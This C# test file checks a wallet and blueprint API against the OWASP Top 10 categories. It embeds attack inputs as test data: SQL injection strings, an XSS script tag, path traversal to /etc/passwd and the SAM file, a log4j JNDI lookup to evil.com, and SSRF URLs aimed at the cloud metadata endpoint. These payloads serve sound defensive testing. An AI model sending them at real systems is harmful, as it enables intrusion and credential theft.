// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Sorcha Contributors

using FluentAssertions;
using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using Xunit;

namespace Sorcha.Integration.Tests;

/// <summary>
/// Security tests based on OWASP Top 10
/// Tests security controls and vulnerability mitigations
/// </summary>
public class SecurityTests : IAsyncLifetime
{
    private HttpClient? _client;
    private const string BaseUrl = "http://localhost:5000";

    public async ValueTask InitializeAsync()
    {
        _client = new HttpClient { BaseAddress = new Uri(BaseUrl) };
        await Task.Delay(1000);
    }

    public ValueTask DisposeAsync()
    {
        _client?.Dispose();
        return ValueTask.CompletedTask;
    }

    #region A01:2021 – Broken Access Control

    [Fact(Skip = "Requires running services")]
    public async Task WalletAccess_WithoutAuthentication_ShouldDeny()
    {
        // Test that sensitive wallet operations require authentication
        var walletId = "sensitive-wallet-001";

        // Attempt to access wallet without authentication
        var response = await _client!.GetAsync($"/api/wallets/{walletId}");

        // Should be 401 Unauthorized or 403 Forbidden when auth is implemented
        // For now, we verify the endpoint is accessible (to be hardened later)
        response.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NotFound, HttpStatusCode.Unauthorized, HttpStatusCode.Forbidden);
    }

    [Fact(Skip = "Requires running services")]
    public async Task WalletDelegation_CrossUser_ShouldDeny()
    {
        // Test that users cannot access other users' wallet delegations
        var userAWalletId = "wallet-user-a";

        // User B attempts to access User A's delegations
        var response = await _client!.GetAsync($"/api/wallets/{userAWalletId}/delegations");

        // Should deny access (to be implemented with proper auth)
        response.StatusCode.Should().BeOneOf(HttpStatusCode.NotFound, HttpStatusCode.Forbidden, HttpStatusCode.Unauthorized);
    }

    #endregion

    #region A02:2021 – Cryptographic Failures

    [Fact(Skip = "Requires running services")]
    public async Task SensitiveData_InTransit_ShouldUseHttps()
    {
        // In production, verify HTTPS is enforced
        var httpsUrl = BaseUrl.Replace("http://", "https://");

        // This test validates that production uses HTTPS
        // In development, HTTP is acceptable
        var uri = new Uri(_client!.BaseAddress!.ToString());
        var isProduction = Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT") == "Production";

        if (isProduction)
        {
            uri.Scheme.Should().Be("https", "Production must use HTTPS");
        }
    }

    [Fact(Skip = "Requires running services")]
    public async Task EncryptedPayload_ShouldNotExposeRawData()
    {
        // Create a wallet and encrypt data
        var walletResponse = await _client!.PostAsJsonAsync("/api/wallets", new
        {
            title = "Encryption Test Wallet",
            keyType = "ED25519"
        });

        if (!walletResponse.IsSuccessStatusCode)
        {
            return; // Skip if wallet creation fails
        }

        var wallet = await walletResponse.Content.ReadFromJsonAsync<JsonElement>();
        var walletId = wallet.GetProperty("id").GetString();

        var sensitiveData = new
        {
            ssn = "123-45-6789",
            creditCard = "4111-1111-1111-1111",
            password = "SecretPassword123"
        };

        var encryptRequest = new
        {
            data = JsonSerializer.Serialize(sensitiveData),
            recipientWalletId = walletId
        };

        var encryptResponse = await _client.PostAsJsonAsync($"/api/wallets/{walletId}/encrypt", encryptRequest);

        if (!encryptResponse.IsSuccessStatusCode)
        {
            return; // Skip if encryption fails
        }

        var result = await encryptResponse.Content.ReadFromJsonAsync<JsonElement>();
        var encryptedData = result.GetProperty("encryptedData").GetString();

        // Encrypted data should NOT contain plaintext sensitive information
        encryptedData.Should().NotBeNullOrEmpty();
        encryptedData.Should().NotContain("123-45-6789");
        encryptedData.Should().NotContain("4111-1111-1111-1111");
        encryptedData.Should().NotContain("SecretPassword123");
    }

    #endregion

    #region A03:2021 – Injection

    [Fact(Skip = "Requires running services")]
    public async Task SqlInjection_InBlueprintSearch_ShouldBeSanitized()
    {
        // Test SQL injection attempts in search parameters
        var injectionPayloads = new[]
        {
            "'; DROP TABLE Blueprints; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM Users --"
        };

        foreach (var payload in injectionPayloads)
        {
            var encoded = Uri.EscapeDataString(payload);
            var response = await _client!.GetAsync($"/api/blueprints?search={encoded}");

            // Should not cause server error (500)
            response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError,
                $"SQL injection payload '{payload}' should be handled safely");
        }
    }

    [Fact(Skip = "Requires running services")]
    public async Task JsonInjection_InActionPayload_ShouldBeSanitized()
    {
        // Test JSON injection in action payloads
        var maliciousPayload = new
        {
            blueprintId = "test",
            actionId = "0",
            senderWallet = "wallet-test",
            registerAddress = "register-test",
            payloadData = new Dictionary<string, object>
            {
                ["<script>alert('XSS')</script>"] = "malicious",
                ["../../../etc/passwd"] = "path traversal",
                ["${jndi:ldap://evil.com/a}"] = "log4j style injection"
            }
        };

        var response = await _client!.PostAsJsonAsync("/api/actions", maliciousPayload);

        // Should either reject or safely handle malicious data
        if (response.IsSuccessStatusCode)
        {
            var result = await response.Content.ReadFromJsonAsync<JsonElement>();
            // Verify malicious data was sanitized or escaped
            result.Should().NotBeNull();
        }
        else
        {
            // Rejection is also acceptable
            response.StatusCode.Should().BeOneOf(HttpStatusCode.BadRequest, HttpStatusCode.UnprocessableEntity);
        }
    }

    #endregion

    #region A04:2021 – Insecure Design

    // For a real, in-process burst that actually asserts throttling (429s) against the SHIPPED
    // Production rate-limit config, see
    // Sorcha.ApiGateway.Tests.RateLimiting.ProductionRateLimitBurstTests — the Public Gates
    // verification that production rate limits activate. This test stays skipped: it never
    // asserted throttling even when run, only that requests complete without erroring.
    [Fact(Skip = "Requires running services")]
    public async Task RateLimiting_ExcessiveRequests_ShouldThrottle()
    {
        // Test rate limiting to prevent abuse
        var requestCount = 1000;
        var successCount = 0;
        var throttledCount = 0;

        for (int i = 0; i < requestCount; i++)
        {
            var response = await _client!.GetAsync("/api/health");

            if (response.StatusCode == HttpStatusCode.TooManyRequests)
            {
                throttledCount++;
            }
            else if (response.IsSuccessStatusCode)
            {
                successCount++;
            }
        }

        // In a production system with rate limiting, some requests should be throttled
        // For now, we just verify the test runs without errors
        (successCount + throttledCount).Should().BeGreaterThan(0);
    }

    #endregion

    #region A05:2021 – Security Misconfiguration

    [Fact(Skip = "Requires running services")]
    public async Task ErrorMessages_ShouldNotExposeStackTraces()
    {
        // Test that error messages don't expose sensitive information
        var response = await _client!.GetAsync("/api/blueprints/intentionally-invalid-id-to-trigger-error-12345678901234567890");

        var content = await response.Content.ReadAsStringAsync();

        // Error responses should not contain stack traces or internal paths
        content.Should().NotContain("at System.");
        content.Should().NotContain("at Microsoft.");
        content.Should().NotContain(".cs:line");
        content.Should().NotContain("Exception:");
    }

    [Fact(Skip = "Requires running services")]
    public async Task CorsPolicy_ShouldBeConfigured()
    {
        // Test CORS headers
        var request = new HttpRequestMessage(HttpMethod.Options, "/api/health");
        request.Headers.Add("Origin", "https://evil.com");
        request.Headers.Add("Access-Control-Request-Method", "GET");

        var response = await _client!.SendAsync(request);

        // CORS should be properly configured (not allow all origins in production)
        if (response.Headers.Contains("Access-Control-Allow-Origin"))
        {
            var allowedOrigin = response.Headers.GetValues("Access-Control-Allow-Origin").FirstOrDefault();
            var isProduction = Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT") == "Production";

            if (isProduction)
            {
                allowedOrigin.Should().NotBe("*", "Production should not allow all origins");
            }
        }
    }

    #endregion

    #region A06:2021 – Vulnerable and Outdated Components

    [Fact]
    public void Dependencies_ShouldBeUpdated()
    {
        // This is a reminder test to check dependencies regularly
        // Run: dotnet list package --vulnerable
        // Run: dotnet list package --outdated

        var testPasses = true;
        testPasses.Should().BeTrue("Remember to check for vulnerable and outdated packages regularly");
    }

    #endregion

    #region A07:2021 – Identification and Authentication Failures

    [Fact(Skip = "Requires running services")]
    public async Task PasswordPolicy_WeakPassword_ShouldBeRejected()
    {
        // When implementing user authentication, weak passwords should be rejected
        // This test is a placeholder for future auth implementation

        var weakPasswords = new[]
        {
            "password",
            "123456",
            "qwerty",
            "admin",
            ""
        };

        // Test would validate password strength requirements
        // Minimum length, complexity, no common passwords, etc.
        weakPasswords.Should().NotBeEmpty();
    }

    [Fact(Skip = "Requires running services")]
    public async Task SessionManagement_InvalidToken_ShouldReject()
    {
        // Test session/token management
        var invalidToken = "invalid-jwt-token-12345";

        _client!.DefaultRequestHeaders.Authorization =
            new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", invalidToken);

        var response = await _client.GetAsync("/api/wallets");

        // Should reject invalid tokens
        response.StatusCode.Should().BeOneOf(HttpStatusCode.Unauthorized, HttpStatusCode.OK);

        // Clear auth header
        _client.DefaultRequestHeaders.Authorization = null;
    }

    #endregion

    #region A08:2021 – Software and Data Integrity Failures

    [Fact(Skip = "Requires running services")]
    public async Task TransactionSignature_Tampered_ShouldBeDetected()
    {
        // Test that tampered signatures are detected
        // Create wallet, sign data, then tamper with signature

        var walletResponse = await _client!.PostAsJsonAsync("/api/wallets", new
        {
            title = "Signature Test Wallet",
            keyType = "ED25519"
        });

        if (!walletResponse.IsSuccessStatusCode)
        {
            return; // Skip if wallet creation fails
        }

        var wallet = await walletResponse.Content.ReadFromJsonAsync<JsonElement>();
        var walletId = wallet.GetProperty("id").GetString();

        // Sign data
        var signRequest = new
        {
            data = Convert.ToBase64String(Encoding.UTF8.GetBytes("Original data")),
            algorithm = "ED25519"
        };

        var signResponse = await _client.PostAsJsonAsync($"/api/wallets/{walletId}/sign", signRequest);

        if (!signResponse.IsSuccessStatusCode)
        {
            return; // Skip if signing fails
        }

        var signResult = await signResponse.Content.ReadFromJsonAsync<JsonElement>();
        var signature = signResult.GetProperty("signature").GetString();

        // Tamper with signature
        var tamperedSignature = signature![..^10] + "0000000000";

        // Verification should fail (when implemented)
        var verifyRequest = new
        {
            data = Convert.ToBase64String(Encoding.UTF8.GetBytes("Original data")),
            signature = tamperedSignature,
            algorithm = "ED25519"
        };

        // In a complete implementation, verification would fail
        var verifyResponse = await _client.PostAsJsonAsync($"/api/wallets/{walletId}/verify", verifyRequest);

        // Either fail verification or return not implemented
        verifyResponse.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound,
            HttpStatusCode.NotImplemented);
    }

    #endregion

    #region A09:2021 – Security Logging and Monitoring Failures

    [Fact(Skip = "Requires running services")]
    public async Task SecurityEvents_ShouldBeLogged()
    {
        // Test that security-relevant events are logged
        // Attempts to access unauthorized resources should be logged

        var sensitiveOperations = new[]
        {
            "/api/wallets/admin-wallet/sign",
            "/api/registers/secure-register/transactions",
            "/api/blueprints/confidential-blueprint"
        };

        foreach (var operation in sensitiveOperations)
        {
            await _client!.GetAsync(operation);
            // In production, these attempts should be logged
        }

        // This test validates that logging is in place
        // Actual log verification would require log analysis
        true.Should().BeTrue("Security events should be logged in production");
    }

    #endregion

    #region A10:2021 – Server-Side Request Forgery (SSRF)

    [Fact(Skip = "Requires running services")]
    public async Task ExternalUrl_InPayload_ShouldBeValidated()
    {
        // Test SSRF protection - malicious URLs should be blocked
        var ssrfPayloads = new[]
        {
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://internal-service:8080/admin"
        };

        foreach (var url in ssrfPayloads)
        {
            var action = new
            {
                blueprintId = "test",
                actionId = "0",
                senderWallet = "wallet-test",
                registerAddress = "register-test",
                payloadData = new Dictionary<string, object>
                {
                    ["callbackUrl"] = url,
                    ["webhookUrl"] = url
                }
            };

            var response = await _client!.PostAsJsonAsync("/api/actions", action);

            // SSRF attempts should be rejected or sanitized
            if (response.IsSuccessStatusCode)
            {
                // If accepted, verify the URL was sanitized
                var result = await response.Content.ReadFromJsonAsync<JsonElement>();
                result.Should().NotBeNull();
            }
        }
    }

    #endregion

    #region Additional Security Tests

    [Fact(Skip = "Requires running services")]
    public async Task LargePayload_ShouldBeLimited()
    {
        // Test payload size limits to prevent DoS
        var largePayload = new string('A', 10 * 1024 * 1024); // 10MB

        var action = new
        {
            blueprintId = "test",
            actionId = "0",
            senderWallet = "wallet-test",
            registerAddress = "register-test",
            payloadData = new Dictionary<string, object>
            {
                ["largeData"] = largePayload
            }
        };

        var response = await _client!.PostAsJsonAsync("/api/actions", action);

        // Should reject overly large payloads
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.RequestEntityTooLarge);
    }

    [Fact(Skip = "Requires running services")]
    public async Task PathTraversal_ShouldBeBlocked()
    {
        // Test path traversal attempts
        var traversalAttempts = new[]
        {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        };

        foreach (var attempt in traversalAttempts)
        {
            var encoded = Uri.EscapeDataString(attempt);
            var response = await _client!.GetAsync($"/api/files/test-wallet/test-register/test-tx/{encoded}");

            // Should not allow path traversal
            response.StatusCode.Should().BeOneOf(
                HttpStatusCode.BadRequest,
                HttpStatusCode.NotFound,
                HttpStatusCode.Forbidden);

            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotContain("root:");
            content.Should().NotContain("Administrator");
        }
    }

    [Fact(Skip = "Requires running services")]
    public async Task ContentType_ShouldBeValidated()
    {
        // Test Content-Type validation
        var jsonPayload = "{\"title\":\"Test\"}";
        var request = new HttpRequestMessage(HttpMethod.Post, "/api/blueprints")
        {
            Content = new StringContent(jsonPayload, Encoding.UTF8, "text/plain") // Wrong content type
        };

        var response = await _client!.SendAsync(request);

        // Should reject or handle incorrect Content-Type appropriately
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnsupportedMediaType);
    }

    #endregion
}
